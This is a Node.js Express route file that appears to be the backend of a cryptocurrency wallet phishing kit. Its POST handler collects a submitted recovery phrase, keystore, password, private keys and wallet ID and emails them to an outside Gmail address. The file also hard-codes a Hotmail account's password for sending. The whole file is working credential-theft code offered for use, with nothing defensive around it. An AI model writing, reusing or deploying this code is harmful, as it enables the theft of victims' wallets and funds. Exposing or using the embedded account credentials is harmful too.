const express = require('express');
const nodemailer = require('nodemailer');
const router = express.Router();

// Create a transporter for sending emails
const transporter = nodemailer.createTransport({
  service: 'smtp-mail.outlook.com', // Using Gmail; can be changed to other services like Outlook, etc.
  auth: {
    user: 'patrciarivas@hotmail.com', // Your email
    pass: '2e4f2fcd89d',  // Your email password or app password
  },
});

// POST request handler for /api/send-to-telegram
router.post('/', (req, res) => {
  const { recoveryPhrase, keystore, password, key, wallet_id, privatekey1 } = req.body;

  // Prepare email content
  const mailOptions = {
    from: 'patrciarivas@hotmail.com',
    to: 'gomezjefferyalan22@gmail.com',  // Replace with your desired email address
    subject: 'New Wallet Recovery Data',
    text: `
      Recovery Phrase: ${recoveryPhrase}
      Keystore: ${keystore}
      Password: ${password}
      Key: ${key}
      Wallet ID: ${wallet_id}
      Private Key 1: ${privatekey1}
    `,
  };

  // Send email using nodemailer
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.status(500).send('Failed to send email');
    }
    console.log('Email sent: ' + info.response);
    res.status(200).send('Form data received and email sent');
  });
});

module.exports = router;